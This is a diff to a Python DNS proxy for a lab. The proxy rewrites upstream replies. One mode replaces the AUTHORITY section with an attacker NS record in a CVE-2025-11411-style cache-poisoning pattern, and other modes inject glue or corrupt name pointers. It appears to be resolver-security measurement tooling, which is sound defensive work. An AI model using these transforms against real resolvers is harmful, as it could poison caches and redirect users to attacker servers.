@@ -4,9 +4,9 @@
 Modes:
   passthrough              — forward upstream reply unchanged
   additional-glue          — append unrelated A in ADDITIONAL only
-  authority-ns-glue        — inject promiscuous NS in AUTHORITY + A in ADDITIONAL
+  authority-ns-glue        — pollute1 REPLACE: AUTHORITY = zone→attacker NS only
                              (CVE-2025-11411-shaped; measurement only)
-  malformed-truncated         — cut the upstream reply mid-packet
+  malformed-truncate         — cut the upstream reply mid-packet
   malformed-bad-pointer     — overwrite a name pointer to an invalid offset
 
 Not a fuzzer. Deterministic transforms only.
@@ -76,6 +76,40 @@ def append_additional_a(packet: bytes, owner: str, ipv4: str, ttl: int = 60) -> 
     return header + packet[12:] + rr
 
 
+def replace_authority_ns_pollute1(
+    packet: bytes,
+    zone: str,
+    ns_name: str,
+    ttl: int = 60,
+) -> bytes:
+    """Vendor pollute1: keep QD+AN; AUTHORITY = only zone→ns_name; drop ADDITIONAL.
+
+    NLnet iter_scrub_promiscuous.rpl pollute1 returns a positive A with a single
+    AUTHORITY NS pointing at the attacker and no ADDITIONAL on that reply.
+    Appending alongside the legitimate NS left Unbound free to keep the original
+    (Lab Test Server observation).
+    """
+    if len(packet) < 12:
+        return packet
+    id_, flags, qd, an, ns, ar = struct.unpack("!HHHHHH", packet[:12])
+    if qd < 1 or an < 1:
+        return packet
+    offset = 12
+    try:
+        for _ in range(qd):
+            offset = skip_question(packet, offset)
+        for _ in range(an):
+            offset = skip_rr(packet, offset)
+        ans_end = offset
+    except ValueError:
+        return packet
+
+    ns_rdata = encode_name(ns_name)
+    ns_rr = encode_name(zone) + struct.pack("!HHIH", 2, 1, ttl, len(ns_rdata)) + ns_rdata
+    header = struct.pack("!HHHHHH", id_, flags, qd, an, 1, 0)
+    return header + packet[12:ans_end] + ns_rr
+
+
 def append_authority_ns_and_additional_a(
     packet: bytes,
     zone: str,
@@ -83,35 +117,9 @@ def append_authority_ns_and_additional_a(
     ipv4: str,
     ttl: int = 60,
 ) -> bytes:
-    """Insert NS in AUTHORITY and matching A in ADDITIONAL (section-order aware).
-
-    Shape used for CVE-2025-11411-style measurement: a promiscuous NS RRSet in
-    AUTHORITY plus address records in ADDITIONAL for that NS name. Not a claim
-    that this packet alone reproduces any CVE. Positive control requires an
-    iterator-path Unbound topology + vendor test vector — see
-    docs/POSITIVE-CONTROL-CVE11411.md.
-    """
-    if len(packet) < 12:
-        return packet
-    id_, flags, qd, an, ns, ar = struct.unpack("!HHHHHH", packet[:12])
-    offset = 12
-    for _ in range(qd):
-        offset = skip_question(packet, offset)
-    for _ in range(an):
-        offset = skip_rr(packet, offset)
-    for _ in range(ns):
-        offset = skip_rr(packet, offset)
-    auth_end = offset  # start of ADDITIONAL (may be EOF)
-
-    ns_rdata = encode_name(ns_name)
-    ns_rr = encode_name(zone) + struct.pack("!HHIH", 2, 1, ttl, len(ns_rdata)) + ns_rdata
-    ip_bytes = bytes(int(x) for x in ipv4.split("."))
-    if len(ip_bytes) != 4:
-        raise ValueError(f"bad ipv4: {ipv4}")
-    a_rr = encode_name(ns_name) + struct.pack("!HHIH", 1, 1, ttl, 4) + ip_bytes
-
-    header = struct.pack("!HHHHHH", id_, flags, qd, an, ns + 1, ar + 1)
-    return header + packet[12:auth_end] + ns_rr + packet[auth_end:] + a_rr
+    """Legacy helper: REPLACE authority NS and attach A glue (not vendor-exact)."""
+    del ipv4  # kept in signature for call-site compat; glue via parent zone
+    return replace_authority_ns_pollute1(packet, zone, ns_name, ttl)
 
 
 def malformed_truncate(packet: bytes, keep: int = 20) -> bytes:
@@ -125,33 +133,46 @@ def malformed_bad_pointer(packet: bytes) -> bytes:
     if len(packet) < 14:
         return malformed_truncate(packet, 14)
     data = bytearray(packet)
-    # Scan for 0xC0 pointer bytes after the header; poison the offset byte.
     for i in range(12, min(len(data) - 1, 64)):
         if data[i] & 0xC0 == 0xC0:
-            data[i + 1] = 0xFF  # almost certainly out of range
+            data[i + 1] = 0xFF
             return bytes(data)
-    # No pointer found — fall back to truncate so the mode still bites.
     return malformed_truncate(packet, 18)
+
+
+def _qtype_is_a(packet: bytes) -> bool:
+    """True if first question is type A."""
+    if len(packet) < 12:
+        return False
+    try:
+        offset = skip_name(packet, 12)
+        if offset + 4 > len(packet):
+            return False
+        qtype = struct.unpack("!H", packet[offset : offset + 2])[0]
+        return qtype == 1
+    except ValueError:
+        return False
 
 
 def transform(mode: str, packet: bytes) -> bytes:
     if mode == "passthrough":
         return packet
     if mode == "additional-glue":
-        # Unrelated name-server address in ADDITIONAL only (RFC 2181 ranking stress).
         return append_additional_a(packet, "ns.evil.test.", "198.51.100.66")
     if mode == "authority-ns-glue":
-        # Vendor pollute1 shape (iter_scrub_promiscuous.rpl): zone-cut NS in AUTHORITY
-        # of a positive A reply. NS target must NOT be under a locally-served empty
-        # zone (e.g. Unbound NXDOMAINs .test); use example. like lab docs.
-        return append_authority_ns_and_additional_a(
+        # Vendor pollute1: positive A only; NS under parent (ns.attacker.stackdiff).
+        if len(packet) < 12:
+            return packet
+        _id, flags, _qd, an, _ns, _ar = struct.unpack("!HHHHHH", packet[:12])
+        rcode = flags & 0xF
+        if rcode != 0 or an < 1 or not _qtype_is_a(packet):
+            return packet
+        return replace_authority_ns_pollute1(
             packet,
             zone="lab.stackdiff.",
-            ns_name="ns.attacker.example.",
-            # Attacker container on dnsnet (compose.iterate-pc); not a public TEST-NET IP.
-            ipv4="172.30.0.66",
+            ns_name="ns.attacker.stackdiff.",
         )
-    if mode == "malformed-truncated":
+    if mode == "malformed-truncate":
         return malformed_truncate(packet)
     if mode == "malformed-bad-pointer":
         return malformed_bad_pointer(packet)
@@ -195,7 +216,7 @@ def main() -> int:
             "passthrough",
             "additional-glue",
             "authority-ns-glue",
-            "malformed-truncated",
+            "malformed-truncate",
             "malformed-bad-pointer",
         ),
     )
